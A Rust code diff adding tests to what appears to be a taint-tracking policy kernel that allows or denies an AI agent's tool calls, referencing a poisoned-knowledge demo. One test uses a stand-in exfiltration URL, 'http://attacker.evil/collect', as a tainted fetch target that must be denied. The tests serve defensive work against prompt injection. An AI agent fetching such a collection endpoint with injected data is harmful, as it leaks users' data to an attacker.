@@ -370,6 +370,77 @@ mod tests {
         assert_eq!(outcome.decision(), Decision::Allow);
     }
 
+    // --- PACT L2 end-to-end through decide() over the real default world -------
+
+    /// `fetch_web` declares `url: Target` in the default world, so a fetch whose
+    /// *url* is clean is allowed even when the ambient session is tainted — the
+    /// Theorem-3 false positive (poisoned_knowledge_demo session-2/step-3),
+    /// recovered by the wired kernel.
+    #[test]
+    fn l2_recovers_clean_url_in_tainted_session() {
+        let world = compile_default();
+        let ctx = EvalContext {
+            taint: TaintContext::from_taint(Taint::Tainted)
+                .with_arg_taint([("url".to_string(), Taint::Clean)]),
+            mode: ExecutionMode::Interactive,
+            usage: BudgetUsage::default(),
+            approval_granted: false,
+        };
+        let outcome = decide(
+            &world,
+            &default_call("fetch_web", json!({ "url": "https://docs.example/guide" })),
+            from_channel(SourceChannel::UserPrompt),
+            &ctx,
+        );
+        assert_eq!(outcome.decision(), Decision::Allow);
+    }
+
+    /// The security property is preserved: when the url itself is tainted-derived,
+    /// the same action is still denied. No false negative.
+    #[test]
+    fn l2_still_blocks_tainted_url() {
+        let world = compile_default();
+        let ctx = EvalContext {
+            taint: TaintContext::from_taint(Taint::Tainted)
+                .with_arg_taint([("url".to_string(), Taint::Tainted)]),
+            mode: ExecutionMode::Interactive,
+            usage: BudgetUsage::default(),
+            approval_granted: false,
+        };
+        let outcome = decide(
+            &world,
+            &default_call(
+                "fetch_web",
+                json!({ "url": "http://attacker.evil/collect" }),
+            ),
+            from_channel(SourceChannel::UserPrompt),
+            &ctx,
+        );
+        assert_eq!(outcome.decision(), Decision::Deny);
+    }
+
+    /// An externally-effectful action with *no* roles (e.g. `update_memory`) keeps
+    /// the conservative ambient floor — L2 changes nothing it was not opted into.
+    #[test]
+    fn action_without_roles_keeps_ambient_floor() {
+        let world = compile_default();
+        let ctx = EvalContext {
+            taint: TaintContext::from_taint(Taint::Tainted)
+                .with_arg_taint([("value".to_string(), Taint::Clean)]),
+            mode: ExecutionMode::Interactive,
+            usage: BudgetUsage::default(),
+            approval_granted: false,
+        };
+        let outcome = decide(
+            &world,
+            &default_call("update_memory", json!({ "key": "k", "value": "v" })),
+            from_channel(SourceChannel::UserPrompt),
+            &ctx,
+        );
+        // No arg_roles on update_memory → ambient Tainted floor → denied, as before.
+        assert_eq!(outcome.decision(), Decision::Deny);
+    }
+
     #[test]
     fn over_command_budget_replans() {
         let world = compile_default();
